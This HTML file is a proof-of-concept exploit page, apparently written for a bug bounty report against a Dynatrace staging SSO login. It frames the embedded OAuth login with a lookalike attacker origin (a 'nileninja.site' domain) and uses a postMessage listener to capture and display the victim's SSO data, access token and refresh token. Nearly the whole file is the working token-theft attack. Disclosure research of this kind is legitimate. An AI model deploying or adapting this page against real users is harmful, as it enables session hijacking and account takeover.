<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>nileninja poc</title>
    
    <!-- Link to JetBrains Mono Font -->
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">

    <!-- Link to external CSS -->
    <link rel="stylesheet" href="style.css">

    <!-- Internal CSS for page styling -->
    <style>
      body {
        font-family: 'JetBrains Mono', monospace;
        background-color: #f4f4f9;
        margin: 0;
        padding: 0;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
      }

      h1 {
        color: #333;
        font-size: 2rem;
      }

      h2 {
        color: #555;
        font-size: 1.5rem;
        margin-top: 20px;
      }

      iframe {
        width: 80%;
        height: 400px;
        border: none;
        margin-top: 20px;
        border-radius: 8px;
      }

      div {
        margin: 10px 0;
        font-size: 1.2rem;
        color: #333;
      }

      span {
        font-weight: bold;
        color: #007BFF;
      }

      button {
        margin-top: 20px;
        padding: 10px 20px;
        font-size: 1rem;
        cursor: pointer;
        border: none;
        border-radius: 5px;
        background-color: #007BFF;
        color: white;
      }

      button:hover {
        background-color: #0056b3;
      }
    </style>
  </head>
  <body>
    <h1>POC file</h1>
    <iframe src="https://chatstage-one.dynatrace.com/api/sso/oauth2/embedded/login?timestamp=1741941638853&origin=https%3A%2F%2Fchatstage-one.dynatrace.com.nileninja.site"></iframe>
    <h2>User's Access Token and Refresh Token, Others</h2>
    <div>
      SSO: <span id="sso"></span>
    </div>
    <div>
      Access Token: <span id="token"></span>
    </div>
    <div>
      Refresh Token: <span id="refresh"></span>
    </div>
    <div>
      Expires In: <span id="exp"></span>
    </div>
    <div>
      Error: <span id="err"></span>
    </div>
    
    <script>    
        window.addEventListener("message", event => {
          // Access the elements where the data will be displayed
          const sso = document.getElementById('sso');
          const accessToken = document.getElementById('token');
          const refreshToken = document.getElementById('refresh');
          const expiryIn = document.getElementById('exp');
          const error = document.getElementById('err');

          // Check if the data exists in the event and update the fields
          if (event.data && event.data.sso !== undefined) {
            sso.textContent = event.data.sso;
            accessToken.textContent = event.data.tokenSet.accessToken;
            refreshToken.textContent = event.data.tokenSet.refreshToken;
            expiryIn.textContent = event.data.tokenSet.expiresInSeconds;
            error.textContent = event.data.error ? event.data.error : 'No error';
          }
      });
    </script>
  </body>
</html>
